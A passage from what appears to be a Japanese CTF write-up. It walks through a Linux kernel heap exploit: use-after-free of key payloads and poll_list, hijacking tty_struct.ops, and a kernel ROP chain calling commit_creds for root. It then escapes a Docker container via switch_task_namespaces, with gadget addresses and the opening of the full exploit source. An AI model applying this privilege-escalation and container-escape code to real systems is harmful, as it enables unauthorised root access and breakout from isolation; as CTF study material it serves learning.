というわけで、上のバグを直して十分な<code>tty_file_private</code>を確保してみた上で、一旦kbaseをリークした直後(keyは全て解放前。UAFされたkeyの上には<code>seq_operations</code>が乗っている)のヒープを見てみるとこんな感じ:</p><p><img src=./heap5.png alt="UAFed key is surrounded by many other user_key_payload, seems good&amp;hellip;"></p><p>一番上がUAFされたkeyで、その直後にはたくさんのkeyが存在していることが分かります(paylod=<code>AAAAA</code>)。理想的な状況ですね。これでも上手くいかないのはなぜ&mldr;。ここで<code>key</code>周りのソースを見返してみます:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-security/keys/keyring.c data-lang=security/keys/keyring.c><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e> * Clean up a keyring when it is destroyed.  Unpublish its name if it had one
</span></span></span><span style=display:flex><span><span style=color:#75715e> * and dispose of its data.
</span></span></span><span style=display:flex><span><span style=color:#75715e> *
</span></span></span><span style=display:flex><span><span style=color:#75715e> * The garbage collector detects the final key_put(), removes the keyring from
</span></span></span><span style=display:flex><span><span style=color:#75715e> * the serial number tree and then does RCU synchronisation before coming here,
</span></span></span><span style=display:flex><span><span style=color:#75715e> * so we shouldn&#39;t need to worry about code poking around here with the RCU
</span></span></span><span style=display:flex><span><span style=color:#75715e> * readlock held by this time.
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>keyring_destroy</span>(<span style=color:#66d9ef>struct</span> key <span style=color:#f92672>*</span>keyring) {...}
</span></span></code></pre></div><p><strong>あ、<code>unlink</code>後にGC(<code>security/keys/gc.c</code>)がfreeするのか&mldr;!</strong> ということは、<code>tty_file_private</code>をスプレーする前に1秒ほどsleepしてGCを待ってやるといいのではと思いやってみると:</p><p><img src=./lgtm2 alt>
<img src=./lgtm3.png alt="kheap leak success after waiting GC for a second"></p><p>よさそう〜〜〜！</p><h2 id=get-rip-by-overwriting-tty_structops>get RIP by overwriting <code>tty_struct.ops</code></h2><p>さて、続いてRIPをとりましょう。や、取らなくても年は越せるんですが。
現状ですが、<code>kmalloc-32</code>にUAFされた<code>user_key_payload</code>(+上に乗っかっている<code>tty_file_private</code>)があります。このUAFを再利用して、今度はUAF writeをしましょう。具体的には、<code>poll_list</code>が<code>kmalloc-1024 -> kmalloc-32</code>のリストになっている時、<code>kmalloc-32</code>をUAFで上書きし、<code>poll_list.next</code>ポインタに<code>tty_struct(kmalloc-1024)</code>のアドレスを書き込んでやります。その状態で<code>poll_list</code>をfreeすることで関係ない<code>tty_struct</code>をfreeしてやることができます。<code>tty_struct</code>をUAFできたら、あとはopsを書き換えてやればいいはず&mldr;多分&mldr;!
というわけで、それらをしてくれるコードがこれです(3分クッキング感):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=display:flex><span>  <span style=color:#75715e>// Free `seq_operations`, one of which is `user_key_payload`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> NUM_SEQOPERATIONS <span style=color:#f92672>-</span> NUM_FREE_SEQOPERATIONS; ix <span style=color:#f92672>!=</span> NUM_SEQOPERATIONS; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    close(seqops_fd[ix]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] Freeed seq_operations&#34;</span>);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  assign_to_core(<span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>  neverend <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;[+] spraying `poll_list` in kmalloc-32...&#34;</span>);
</span></span><span style=display:flex><span>  num_threads <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_2ND_POLLLIST_ALLOC; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>struct</span> alloc_poll_list_t <span style=color:#f92672>*</span>arg <span style=color:#f92672>=</span> malloc(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> alloc_poll_list_t));
</span></span><span style=display:flex><span>    arg<span style=color:#f92672>-&gt;</span>fd <span style=color:#f92672>=</span> just_fd; arg<span style=color:#f92672>-&gt;</span>id <span style=color:#f92672>=</span> ix;
</span></span><span style=display:flex><span>    arg<span style=color:#f92672>-&gt;</span>timeout_ms <span style=color:#f92672>=</span> <span style=color:#ae81ff>3000</span>; <span style=color:#75715e>// must 1000 &lt; timeout_ms, to wait key GC
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    arg<span style=color:#f92672>-&gt;</span>num_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>30</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(pthread_create(<span style=color:#f92672>&amp;</span>threads[ix], NULL, alloc_poll_list, arg) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) errExit(<span style=color:#e6db74>&#34;pthread_create&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Revoke UAFed key, which is on `poll_list` in kmalloc-32
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] Freeing UAFed key...&#34;</span>);
</span></span><span style=display:flex><span>  free_key(uafed_key);
</span></span><span style=display:flex><span>  sleep(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Spray keys on UAFed `poll_list`
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  puts(<span style=color:#e6db74>&#34;[+] spraying keys in kmalloc-32&#34;</span>);
</span></span><span style=display:flex><span>  assert(num_keys <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>key_payload <span style=color:#f92672>=</span> malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>    memset(key_payload, <span style=color:#e6db74>&#39;X&#39;</span>, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
</span></span><span style=display:flex><span>     _alloc_key_prefill_ulong_val <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xDEADBEEF</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> NUM_2ND_KEY_SPRAY; <span style=color:#f92672>++</span>ix) {
</span></span><span style=display:flex><span>      alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><p><code>user_key_payload</code>を確保する前に予め<code>setxattr()</code>で<code>0xDEADBEEF</code>を書き込んでいます。これによって、<code>user_key_payload.rcu</code>がこの値になり、且つ<code>poll_list.next</code>がこの値になるはず。実行してみると&mldr;:</p><p><img src=./panic2.png alt="Kernel memory overwrite attempt detected to SLUB object"></p><p>??? <code>Kernel memory overwrite attempt detected to SLUB object 'filp'</code>らしいです。ソースを読んでみると、これは<code>CONFIG_HARDENED_USERCOPY</code>が有効な場合に表示される文面みたいですね。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mm/usercopy.c data-lang=mm/usercopy.c><span style=display:flex><span><span style=color:#66d9ef>void</span> __noreturn <span style=color:#a6e22e>usercopy_abort</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>name, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>detail,
</span></span><span style=display:flex><span>			       <span style=color:#66d9ef>bool</span> to_user, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> offset,
</span></span><span style=display:flex><span>			       <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> len)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    pr_emerg(<span style=color:#e6db74>&#34;Kernel memory %s attempt detected %s %s%s%s%s (offset %lu, size %lu)!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,
</span></span><span style=display:flex><span>       to_user <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;exposure&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;overwrite&#34;</span>,
</span></span><span style=display:flex><span>       to_user <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;from&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;to&#34;</span>,
</span></span><span style=display:flex><span>       name <span style=color:#f92672>?</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;unknown?!&#34;</span>,
</span></span><span style=display:flex><span>       detail <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34; &#39;&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>, detail <span style=color:#f92672>?</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>, detail <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;&#39;&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>       offset, len);
</span></span><span style=display:flex><span>    BUG();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>__check_heap_object</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>ptr, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> n, <span style=color:#66d9ef>struct</span> page <span style=color:#f92672>*</span>page, <span style=color:#66d9ef>bool</span> to_user)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    usercopy_abort(<span style=color:#e6db74>&#34;SLUB object&#34;</span>, s<span style=color:#f92672>-&gt;</span>name, to_user, offset, n);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>何回かやってみると、keyのスプレーの際に<code>filp</code>とか<code>worker_pool</code>とかいう<code>kmalloc-256</code>サイズのキャッシュへのoverwriteが検知されて落ちているみたいです。おそらくですが、<code>poll_list</code>をスプレーするスレッドを立ち上げてからすぐに<code>user_key_payload</code>をfreeさせるようにしていたため、UAFしているオブジェクトに<code>poll_list</code>が確保される前に<code>user_key_payload</code>がfreeされてしまい、<code>seq_operations</code>のfreeと相まってdouble freeになってヒープが崩壊してしまったせいなんじゃないかと思います。そこで、スレッドを立ち上げた後に少しだけsleepしてみると、とりあえずこのエラーは出なくなりました。<strong>必要なguessingは、必要です。</strong></p><p><img src=./panic3.png alt=DEADBEEF!></p><p>dead beef、良さそう！続いて、deadbeefをちゃんと先程leakした<code>tty_struct</code>のアドレスにしてUAFし、その後で<code>0x1000</code>サイズの<code>user_key_payload</code>をスプレーすることで全て<code>0x5401</code>(<code>tty_struct</code>のmagic number)で埋めてみると:</p><p><img src=./panic4.png alt="got a RIP"></p><p>うんうん、良さそう。<code>tty_struct.ops</code>も一緒に<code>0x5401</code>に書き換えたので、ちゃんと落ちてくれてますね！RIPが取れました。</p><h2 id=get-root-by-krop-on-tty_struct-itself>get root by kROP on <code>tty_struct</code> itself</h2><p>TTYへの<code>ioctl()</code>によって、ジャンプ直後のレジスタの値は以下のようになります:</p><p><img src=./regs.png alt="register values after jmp-ing to ioctl"></p><p><code>RBX, RCX, RSI</code>は第2引数で4byte、<code>RDX, R8, R12</code>は第3引数で8byteだけ任意に指定できます。<code>RDI</code>と<code>RBP</code>と<code>R14</code>は<code>tty_struct</code>自身を指します。stack pivotをするために、<code>push RXX, JMP RYY, POP RSP</code>のようなことをしたいのですが、<code>RSI</code>達は4byteしか指定できないため使うことはできません。
さて、みなさんも覚えておきましょう、<strong><code>tty_struct</code>はまじでROPしやすいです</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-payload.c data-lang=payload.c><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>key_payload <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x1000</span>);
</span></span><span style=display:flex><span>    ulong <span style=color:#f92672>*</span>buf <span style=color:#f92672>=</span> (ulong<span style=color:#f92672>*</span>)key_payload;
</span></span><span style=display:flex><span>    buf[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x5401</span>; <span style=color:#75715e>// magic, kref (later `leave`ed and become RBP)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    buf[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff8191515a</span>); <span style=color:#75715e>// dev (later become ret addr of `leave` gadget, which is `pop rsp`)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    buf[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> km1024_leaked <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x120</span>; <span style=color:#75715e>// driver (MUST BE VALID) (later `pop rsp`ed)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    buf[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> km1024_leaked <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50</span>; <span style=color:#75715e>// ops
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    ulong <span style=color:#f92672>*</span>ops <span style=color:#f92672>=</span> (ulong<span style=color:#f92672>*</span>)(key_payload <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> ix <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; ix <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0x120</span> <span style=color:#f92672>/</span> <span style=color:#ae81ff>8</span>; <span style=color:#f92672>++</span>ix) { <span style=color:#75715e>// sizeof tty_operations
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      ops[ix] <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81577609</span>); <span style=color:#75715e>// pop rsp
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    ulong <span style=color:#f92672>*</span>rop <span style=color:#f92672>=</span> (ulong<span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)ops <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x120</span>);
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> ...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    assert((ulong)rop <span style=color:#f92672>-</span> (ulong)key_payload <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>516</span>);
</span></span></code></pre></div><p>まず、<code>ops</code>を書き換えて<code>tty_struct + 0x50</code>を指すようにします。この領域に偽のvtableとして<code>leave</code>するガジェットのアドレスを入れておきます。すると、上で書いたように<code>RBP</code>には<code>tty_struct</code>自身のアドレスが入っているため、<code>leave</code>すると<code>tty_struct</code>のアドレスが<code>RSP</code>に入ります。この状態で<code>RET</code>すると、<code>tty_struct + 8</code>に入っているアドレスに戻ることになります。ここは<code>tty_struct.dev</code>ポインタであり、壊れてても良い値なので、ここに<code>tty_struct + 0x50 + 0x120</code>のアドレスを入れておきます。あとは、<code>+0x50 + 0x120</code>の領域に好きなROPを組んでおくだけです。本当に、ROPのためにある構造体と言っても過言ではありません。偶然magic numberもvalidでなくてはいけないポインタ(<code>+0x10: driver</code>)を壊すことなくいけます。奇跡の構造体です。
ROP自体はこんな感じ:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-rop.c data-lang=rop.c><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81906510</span>); <span style=color:#75715e>// pop rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810ebc90</span>); <span style=color:#75715e>// prepare_kernel_cred
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff812c32a9</span>); <span style=color:#75715e>// pop rcx (to prevent later `rep`)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop <span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81a05e4b</span>); <span style=color:#75715e>// mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810eba40</span>); <span style=color:#75715e>// commit_creds
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81c00ef0</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x16</span>); <span style=color:#75715e>// swapgs_restore_regs_and_return_to_usermode + 0x16
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                                             <span style=color:#75715e>// mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> (ulong)NIRUGIRI;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> user_cs;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> user_rflags;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> (ulong)krop_stack <span style=color:#f92672>+</span> KROP_USTACK_SIZE <span style=color:#f92672>/</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> user_ss;
</span></span></code></pre></div><p><img src=./root.png alt="got a ROOT"></p><p>ルート！</p><h2 id=container-escape>container escape</h2><p>しかし、この問題はこれで終わりではありません。コンテナの中なので、コンテナエスケープする必要があります。個々から先の知識は全くありません、またもやカンニングしましょう。こっから先は写経です。意味のある写経です。カス写経です。
といっても、RIPとれてればそんなに難しいことではないみたい。docker内では<code>setns()</code> syscallは禁止されてるから、今回はfilesystem namespaceだけ移動させます。以下の感じ:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-abst.c data-lang=abst.c><span style=display:flex><span><span style=color:#75715e>// ROOTをとるには...?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>commit_cred(prepare_kernel_cred(<span style=color:#ae81ff>0</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// docker escape(fs)するには...?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>switch_task_namespaces(find_task_vpid(<span style=color:#ae81ff>1</span>), init_nsproxy);
</span></span><span style=display:flex><span>current<span style=color:#f92672>-&gt;</span>fs <span style=color:#f92672>=</span> copy_fs_struct(init_fs);
</span></span></code></pre></div><p>これだけ！やった〜〜〜〜。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-rop.c data-lang=rop.c><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81906510</span>); <span style=color:#75715e>// pop rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>; <span style=color:#75715e>// init process in docker container
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810e4fc0</span>); <span style=color:#75715e>// find_task_by_vpid
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff812c32a9</span>); <span style=color:#75715e>// pop rcx (to prevent later `rep`)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop <span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81a05e4b</span>); <span style=color:#75715e>// mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff819b21d3</span>); <span style=color:#75715e>// pop rsi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff8245a720</span>); <span style=color:#75715e>// &amp;init_nsproxy
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810ea4e0</span>); <span style=color:#75715e>// switch_task_namespaces
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81906510</span>); <span style=color:#75715e>// pop rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff82589740</span>); <span style=color:#75715e>// &amp;init_fs
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff812e7350</span>); <span style=color:#75715e>// copy_fs_struct
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff8131dab0</span>); <span style=color:#75715e>// push rax; pop rbx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81906510</span>); <span style=color:#75715e>// pop rdi
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> getpid();
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff810e4fc0</span>); <span style=color:#75715e>// find_task_by_vpid
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff8117668f</span>); <span style=color:#75715e>// pop rdx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x6E0</span>;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff81029e7d</span>); <span style=color:#75715e>// add rax, rdx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> KADDR(<span style=color:#ae81ff>0xffffffff817e1d6d</span>); <span style=color:#75715e>// mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>rop<span style=color:#f92672>++</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>// trash
</span></span></span></code></pre></div><h2 id=アウトロ>アウトロ</h2><p><img src=./full-exp.gif alt="uouo fish life"></p><p>うおうおふぃっしゅらいふ。</p><h2 id=full-exploit>Full Exploit</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-exploit.c data-lang=exploit.c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;./exploit.h&#34;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;bits/pthreadtypes.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;keyutils.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;pthread.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*********** commands ******************/</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define DEV_PATH &#34;/proc_rw/cormon&#34;   </span><span style=color:#75715e>// the path the device is placed
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*********** constants ******************/</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define DESC_KEY_TOBE_OVERWRITTEN_SEQOPS &#34;exploit0&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS 0x8
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_KEY_SPRAY (0x60)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_2ND_KEY_SPRAY (NUM_KEY_SPRAY * 2)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_3RD_KEY_SPRAY (0x10 + 0x8)
</span></span></span><span style=display:flex><span><span style=color:#75715e>#define NUM_3RD_KEY_SIZE (0x290)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
